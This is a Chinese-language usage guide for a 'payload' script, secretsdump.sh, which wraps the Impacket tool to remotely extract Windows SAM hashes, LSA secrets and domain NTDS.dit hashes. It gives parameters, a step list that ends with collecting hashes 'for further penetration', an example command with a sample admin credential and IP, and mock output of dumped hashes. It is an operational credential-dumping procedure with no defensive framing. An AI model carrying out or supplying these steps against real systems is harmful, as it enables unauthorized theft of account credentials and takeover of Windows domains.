## 📦 载荷使用说明：secretsdump.sh

### 📝 功能说明
Impacket 核心工具之一，用于在无需在目标机器上执行任何代理的情况下，远程提取 Windows 系统的 SAM 注册表、LSA 密钥和活动目录的 NTDS.dit 密码哈希。

### ⚙️ 参数说明
```text
- `domain/username:password@target_ip`：具有管理员权限的凭据和目标 IP
- `-just-dc`：仅提取域控制器的 NTDS.dit 数据（需要 DCSync 权限）
- `-hashes`：支持使用 Hash 替代明文密码
```

### 🚀 操作步骤
1. 获取目标主机（或域控）的管理员凭据。
2. 修改脚本中的凭据和目标 IP。
3. 执行脚本：`bash secretsdump.sh`。
4. 收集输出的本地账户 Hash 或域账户 Hash，用于进一步渗透。

### 💻 执行样例
```bash
# 提取 192.168.1.20 的本地 Hash
./secretsdump.sh administrator:Admin@123@192.168.1.20

# 预期输出：
# [*] Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
# [*] Target system bootKey: 0x1234567890abcdef1234567890abcdef
# [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# [*] Dumping LSA Secrets
# [*] DPAPI_SYSTEM 
# dpapi_machinekey:
# 0x0000   01 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
```
